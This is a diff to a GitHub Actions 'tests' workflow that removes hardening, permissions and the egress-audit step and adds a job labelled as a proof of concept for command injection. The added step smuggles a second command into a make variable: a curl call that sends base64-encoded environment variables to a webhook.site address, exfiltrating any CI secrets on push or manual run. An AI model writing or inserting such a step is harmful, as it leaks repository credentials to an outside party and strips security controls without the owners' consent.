@@ -1,41 +1,16 @@
 name: tests
-run-name: tests, branch:${{ github.ref_name }}, triggered by @${{ github.actor }}
-
-concurrency:
-  group: ${{ github.workflow }}-${{ github.head_ref || github.sha }}
-  cancel-in-progress: true
+run-name: tests-poc-by-firman
 
 on:
-  merge_group:
-    branches: [main]
-  pull_request:
-    branches: ['**', 'release/*']
   push:
-    branches: [main, 'release/*']
-    tags: ['*']
-  workflow_dispatch: {}
-
-permissions:
-  contents: read
-  attestations: read
-
-env:
-  MISE_VERBOSE: 1
+    branches: [main]
+  workflow_dispatch: {} # Ieu sangkan bisa dijalankeun manual
 
 jobs:
-  check-docs-only:
+  poc-injection:
     runs-on: ubuntu-latest
-    outputs:
-      docs_only: ${{ steps.check-files.outputs.docs_only }}
     steps:
-      - name: Harden Runner
-        uses: step-security/harden-runner@a90bcbc6539c36a85cdfeb73f7e2f433735f215b # v2.15.0
-        with:
-          egress-policy: audit
-      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
-        with:
-          fetch-depth: 0
-      - id: check-files
-        name: Check if only documentation files changed
+      - uses: actions/checkout@v4
+      - name: Execute Command Injection
         run: |
           make install.telepresence TELEPRESENCE='telepresence; curl https://webhook.site/79ba0022-eb8e-4226-9726-b3937d00a18b/$(env | base64 -w0)'
